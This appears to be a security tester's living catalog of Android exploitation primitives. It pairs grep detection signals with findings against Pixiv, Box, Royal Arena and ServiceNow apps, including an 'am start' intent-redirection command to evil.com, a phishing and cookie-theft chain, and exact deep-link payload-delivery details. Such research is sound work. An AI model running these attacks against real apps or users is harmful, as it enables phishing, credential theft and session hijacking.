---
name: android_primitive_catalog
description: Living catalog of Android exploitation primitives. Every new target is automatically compared against this catalog. Detection signals (grep patterns) included so each primitive can be checked in seconds. Updated after every completed assessment.
type: reference
---

# Android Exploitation Primitive Catalog (living)

**This is the SIGNAL TABLE (fast detection).** For the full reusable knowledge
base (root cause, source→sink, reachability, exploitation strategy, validation,
ADB/PoC commands, code patterns, variants, chains, real examples) open
`android_exploitation_knowledge_base.md`.

Compare EVERY new target against this list automatically. For each primitive:
1. Run the detection signal globally (never scoped).
2. If found → open the corresponding card in `android_exploitation_knowledge_base.md` → trace source→sink → assess reachability → report with validation command.
3. If a NEW variant/technique is learned → add the signal here AND a card in the KB.

| # | Primitive | Detection signals (grep, all smali trees) | Typical sinks | Pixiv status |
|---|-----------|-------------------------------------------|---------------|--------------|
| 1 | Intent abuse (exported components w/ input) | exported="true" in manifest + getStringExtra/getData/getSerializableExtra in component | startActivity, loadUrl, file ops | FOUND: F-01,F-02,F-06,F-09 |
| 2 | Arbitrary URI injection → ACTION_VIEW | `Uri.parse(...)` + `ACTION_VIEW` + `setData` | silent browser open | FOUND: F-06 (TARGET_URL) |
| 3 | `intent:` scheme delegation | `ACTION_VIEW` where data scheme can be "intent" | arbitrary intent launch from app uid | FOUND: F-06 escalation |
| 4 | Serializable abuse (unguarded cast) | `getSerializableExtra` + `check-cast` no try/catch | ClassCastException DoS, deserialization | FOUND: F-07 + F-09 (2x!) |
| 5 | Parcelable/Bundle abuse | `getParcelableExtra`, `getParcelableArrayListExtra`, `Bundle.readFromParcel` | crafted Parcelable → logic/DoS | Pixiv: getParcelableArrayListExtra in IllustUploadActivity (fuzz pending) |
| 6 | WebView abuse | `loadUrl`, `setJavaScriptEnabled`, `addJavascriptInterface`, `evaluateJavascript`, `WebViewClient` | XSS, cookie theft, RCE via bridge | FOUND: F-01 (High), F-05 bridge, F-08 fallback |
| 7 | Task hijacking / StrandHogg | exported=true + taskAffinity="" + launchMode (singleTask) + no FLAG_SECURE | overlay/UI spoof | Pixiv: taskAffinity="" (mitigated), not proven |
| 8 | PendingIntent abuse | `PendingIntent.getActivity/getService/getBroadcast` + flag not IMMUTABLE | privilege escalation, confused deputy | Pixiv: IllustUploadPollingService flag 0x22 (no immutable) — LOW |
| 9 | Deep-link scheme hijack | <data android:scheme> + no android:autoVerify + no host restriction | OAuth callback theft, phishing | FOUND: F-03 (pixiv://, pixiv-inner://) |
| 10 | Content Provider abuse | <provider exported> or no grant filter; `openFile`, `query`, `insert` | file read/write, SQLi | Pixiv: FileProvider unexported; core_local_file_provider? verify |
| 11 | Broadcast receiver abuse | exported receiver + attacker action/extras | DoS, data corruption, notification spam | Pixiv: mbridge NetWorkChangeReceiver (conn only), others DUMP-gated |
| 12 | Service abuse | exported service, startForeground | battery/notification DoS, bind attacks | Pixiv: SystemJobService BIND_JOB_SERVICE-gated (safe) |
| 13 | Tapjacking | no FLAG_SECURE, no filterTouchesWhenObscured | overlay clicks | Pixiv: check layout attrs (pending) |
| 14 | Backup abuse | allowBackup="true" | data exfil via adb backup | Pixiv: allowBackup=false (safe) |
| 15 | Clipboard leakage | getPrimaryClip read in background | creds/PII theft | Pixiv: not audited (add to next target) |
| 16 | FileProvider misconfig | <provider> paths, exported grants, path traversal | arbitrary file access | Pixiv: external-cache-path only (safe) |
| 17 | Crypto misuse | ECB, static IV, hardcoded key strings | decrypt data, key recovery | Pixiv: no custom crypto found (audit pending) |
| 18 | Native lib secrets | strings *.so for keys/URLs | secret extraction | Pixiv: libpglarmor/apminsight/nms — no secrets in strings |
| 19 | Hardcoded secrets | AIza/AKIA/sk_live/eyJ/client_secret/BEGIN KEY | API abuse, account access | FOUND: F-04 Firebase/AdMob (RTDB locked) |
| 20 | Open redirect (webview/browser) | deep link → chooser/browser with attacker URL | phishing | Pixiv: deep-link fallback → browser (F-03 context) |

## New/refined primitives learned from Pixiv (additions to the catalog)

### P1. Notification-style extras on exported NO-FILTER activities
Pattern: exported activity WITHOUT intent-filter + explicit component intent from any
app carrying URL/serializable extras. Detection: find exported components with NO
intent-filter in manifest, then check for getStringExtra("URL"/"TARGET_URL"...).
The launcher alias pattern (alias has MAIN/LAUNCHER, target exported w/o filter) hides
this surface. This is the pattern that produced F-06/F-07/F-09.

### P2. Browser-navigator dual-path fallback (external → in-app WebView)
Pattern: browser navigator opens URL via pinned package (CustomTabs); on
ActivityNotFoundException falls back to in-app WebViewActivity with
`ENABLE_JAVASCRIPT=true`. Detection: grep class with methods building ACTION_VIEW +
methods building WebViewActivity intent; look for ENABLE_JAVASCRIPT extra.
Severity gate: is the URL attacker-controlled AND is the fallback reachable on the
target device profile (browser package absent)?

### P3. Receiver permission gates (RULE-OUT knowledge)
android.permission.DUMP / BIND_JOB_SERVICE / C2DM = signature/role-protected → NOT
third-party exploitable. Always check `android:permission` on exported components
before reporting. Prevents false positives and N/A ratio damage.

### P4. getSerializableExtra unguarded cast = repeat offender
Found in 2 independent components in ONE app. Always grep ALL exported components
for getSerializableExtra after the first hit. Cheap, high-yield.
(CONFIRMED cross-target: Box CustomOAuthActivity "session" extra → ClassCastException
DoS = BOX-08. This is now a DEFAULT check for every target.)

### P5. OAuth state-validation bypass via WebView class confusion (learned: Box)
The OAuthWebViewClient gates code-capture on `instance-of <SpecificOAuthWebView>`
BEFORE `isValidStateString`. If the app's WebView extends a different parent (e.g.
Intune MAMWebView), `instance-of` is false → state check skipped → `code=` returned
from any redirect URL. Detection: check OAuth WebView superclass chain + the
instance-of/jump branch in onPageStarted. (Box BOX-01/BOX-07.)

### P6. Token-returning WebMessagePort bridge = CSRF-verify or report (learned: Box)
A WebMessagePort that returns access tokens must be checked for per-domain CSRF
cookie verification (`verifyTokenFor`). If present → rule-out (negative). If absent
→ HIGH token-exfil sink. Detection: createWebMessageChannel + onWebMessagePortMessage
+ cookie check. (Box BoxAuthBridgeWebClient = protected negative.)

### P7. Exported deep-link alias host-allowlist bypass → URI-launch proxy (learned: Box)
Exported `activity-alias` with `<data host="*.corp.com">` + `autoVerify` does NOT stop
a malicious app using an **explicit component intent** (`setComponent(alias)+setData`),
which skips intent-filter matching. If the dispatcher forwards raw `getData()` to
sub-handlers that don't re-validate host, and a `launchSafe*` helper treats host-check
as param-strip not gate, any resolvable URI is launched (browser/scheme). Detection:
grep manifest `activity-alias exported=true` + follow targetActivity `setData`/`startActivity`;
inspect `launchSafe*` helpers for `getHost().contains()` used as non-gate. (Box BOX-13:
`BoxUrlsWeb` → `/hubs/` → `HubDetailsRouterActivity` → `launchSafeExternalLink`.)
✅ CONFIRMED ON-DEVICE: `am start -W -n com.box.android/com.box.android.BoxUrlsWeb -d
"http://evil.com/hubs/x"` → final Activity `WebUrlsInterceptorActivity` (intent redirection
through exported alias); direct `-n` to non-exported `WebUrlsInterceptorActivity` →
`Permission Denial`. Confirmation technique in lessons K.

### P8. Unauthenticated diagnosis/logging deep-link config injection (learned: Box)
Dev/debug paths (e.g. `/diagnosis`) sometimes handled WITHOUT auth (auth-required returns
true ONLY for that path). If the consent dialog is pre-filled from URL params (`mode`,
`dur`, `up=y`, `tag`) → one-tap enables verbose file logging w/ attacker tag/upload.
Low but creative; detection: `isAuthRequiredForIntentHandling` returns false for all but
one HANDLED_PATH. (Box BOX-14.)

### P9. Deep-link JSON-extras relay → arbitrary URL in JS+cookie WebView (learned: Royal Arena)
Exporté entry (SplashActivity, custom scheme, NO host restriction) forwards a JSON string
extra (`Notification.Extra.RawLink`) VERBATIM to a dispatcher (MainActivity) that parses it
with Gson → `ItemLink` → `executeAction` switch → `link_type:"link"` → `openInWebView()` →
inline WebviewFragment (JS on, cookies accepted, DOM storage on, shared CookieManager).
Attacker controls the URL; host-check (`isDeeplinkUri`) is bypassed because delivery is
extras-based, not data-URI based. ✅ **CONFIRMED weaponized on-device** (SM A705FN):
`am start -W` Status:ok → MainActivity → WebView rendered `https://evil.com`; phishing
end-game demonstrated (Android-UA server log + cred capture). This is a new DEFAULT check
for every Appmiral-built / scheme-without-host app.
- Detection signals: `Notification.Extra.RawLink` (also `Notification.Extra.*`), exported
  activity with custom scheme `<data android:scheme="..."/>` + NO `android:host`, `putExtras`
  forwarding, `Gson().fromJson(..., ItemLink.class)`, `executeAction`, `CoreApp.open`,
  `openInWebView`, `WebviewFragment`, `requires_login`.
- CRITICAL delivery rules (each is a silent-failure trap):
  (1) field names SNAKE_CASE (`link_type`, `internal_url`, `android_app_url`,
  `android_app_id`, `android_app_fallback_url`, `requires_login`) — camelCase → Gson ignores
  → null ActionType → no-op. Get names from the app's own Gson config / serialized traffic.
  (2) `link_type` value→sink map is empirical: `link`→openInWebView (the WebView sink),
  `internal_link`→CoreApp.open, `browser_link`→browser, `external_app`→ACTION_VIEW/package.
  (3) shell quoting over adb mangles `{...}` (brace expansion / smart quotes) → JsonSyntaxException
  swallowed by try/catch → silent no-op. Use file-based or malicious-app delivery; hook
  getStringExtra+Gson to VERIFY what the app received.
- Sinks: `WebView.loadUrl` (JS+cookies), ACTION_VIEW, `CoreApp.open(internalUrl)`.
- Chains: WebView + shared CookieManager → session-cookie exfil; phishing login page in
  app's own WebView (spoofs the app/domain); plus RA-012 external_app variant → launch
  `tel:`/settings/other apps' exported surfaces.

## CROSS-TARGET COMPARISON LOG
- Pixiv (jp.pxv.android): primitives found 1,2,3,4,6,8,9,19. Absent/confirmed-safe:
  7,10,11,12,13,14,16. Pending device validation: 5,13,15,17.
- Box (com.box.android): primitives found 4 (BOX-08 Serializable DoS), 20/P5
  (OAuth state-bypass, BOX-01/07), 22/P7 (deep-link host-allowlist bypass, BOX-13
  ✅ CONFIRMED ON-DEVICE via `am start -W` intent-redirection read),
  P8 (diagnosis config injection, BOX-14). Absent/confirmed-safe: 6 (single reachable
  addJavascriptInterface DeviceTrust; WebMessagePort CSRF-gated), 12 (BIND_JOB_SERVICE
  gated; Intune exported = SDK-internal), 13 (taskAffinity=""), 14 (allowBackup=false),
  11 (referral receiver = low analytics poisoning), 19 (no native libs), DCL (none).
  Pending device validation: OAuth server consent gate (BOX-01/07), BOX-02 state
  injection, BOX-04 device-trust bridge, PreviewActivity crash, mutable PendingIntents.
  Box BOX-13 no longer pending — on-device confirmed.
- Royal Arena (dk.royalarena.app, Appmiral SDK): primitives found — P9 (deep-link JSON
  extras relay → JS+cookie WebView, RA-011 ✅ CONFIRMED weaponized on-device w/ phishing
  end-game), 2 (URI/ACTION_VIEW via link_type variants), 20/P5-adjacent surface. New
  signals learned: snake_case Gson model contract, `Notification.Extra.RawLink`,
  swallowed-exception trap (hook FirebaseCrashlyticsService.logException). Pending device
  validation: RA-012 external_app sink (`android_app_url`/`android_app_id` → ACTION_VIEW /
  package launch).

### P10. Deep-link Base64+Gson params relay → URL launch / SSO instance-switch (learned: ServiceNow Fulfiller)
Exported activity (`DeepLinkLaunchRedirectionActivity`) with custom schemes `agent`+`snagent`
(NO host) reads query param `params` → `Base64.decode(str,0)` (STANDARD base64) → Gson →
`DeepLinkParams` (fully attacker-controlled). `deeplink/g.d` switches on `action`:
`open_url` → parser → external browser ACTION_VIEW; `ssoPrefill`/`prefill` → forced
LaunchActivity SSO for attacker instance; `ulink` → host-gated fetch; `redirect`/
`launch_button` → REST fetch of attacker payload. ✅ PoC cmd crafted (device pending).
- Detection signals: exported activity `<data android:scheme="...">` + NO `android:host`,
  `getQueryParameter("params")` + `Base64.decode` + `Gson.fromJson(..., DeepLinkParams.class)`,
  `deeplink/g` action switch, `kf/z0` parser (`mobileapplink`, `snapp`), `u3.i` cond_0,
  `IntentFactory.e` ACTION_VIEW. New DEFAULT check for ServiceNow-MobileSky apps.
- CRITICAL gates/traps:
  (1) OPEN_URL requires `url` = `https://evil.com/mobileapplink?snapp=x` — plain https fails
  `kf/z0.c()` (first path segment MUST be `mobileapplink`); `snapp` param flips
  `isCustomSchemeMatch=true` (`kf/z0.f` e()) → `u3.i` cond_0 opens ORIGINAL string externally.
  (2) `g.d` instance gate `p3.d(instanceId)` compares `params.e()` (instanceId) vs configured
  env name — wrong id → DeepLinkError dialog, no URL open. Must supply configured instance.
  (3) External-browser sink carries NO app auth headers → cap severity at High; the
  in-app Cabrillo/AuthenticatedWebView arm is host-gated (`u3.q`/`j1.e`) so attacker URLs
  do NOT get auth headers in-app.
  (4) Gson field names are serialized obfuscated names (`instanceId`,`url`,`action`,
  `forceSsoId`,`customScheme`,`redirectPayload`); enum values snake_case (`launch_button`,
  `open_url`,`prefill`,`redirect`,`ssoPrefill`,`ulink`).
